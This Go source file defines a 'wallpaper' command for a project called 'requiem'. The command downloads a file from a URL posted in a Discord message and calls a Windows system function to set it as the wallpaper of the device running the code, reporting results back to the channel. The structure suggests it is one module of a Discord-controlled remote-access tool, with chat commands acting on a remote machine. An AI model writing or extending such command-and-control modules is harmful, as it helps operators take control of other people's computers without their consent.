package commands

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"requiem/store"
	"requiem/utils"
	"requiem/utils/discord"

	"github.com/bwmarrin/discordgo"
)

func (*WallpaperCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	urls := discord.GetUrls(msg)
	if len(urls) == 0 {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to find any urls.", msg.Reference())
		return
	}

	path, err := utils.DownloadFile(urls[0], "")
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to download - %s", err), msg.Reference())
		return
	}

	defer os.Remove(path)

	pointer, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to resolve path - %s", err), msg.Reference())
		return
	}

	ret, _, _ := store.SystemInfo.Call(
		uintptr(0x0014),
		uintptr(0),
		uintptr(unsafe.Pointer(pointer)),
		uintptr(0x01|0x02),
	)

	if ret == 0 {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to set wallpaper.", msg.Reference())
		return
	}

	ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully set wallpaper.", msg.Reference())
}

func (*WallpaperCommand) Name() string {
	return "wallpaper"
}

func (*WallpaperCommand) Info() string {
	return "Sets the device wallpaper."
}

type WallpaperCommand struct{}
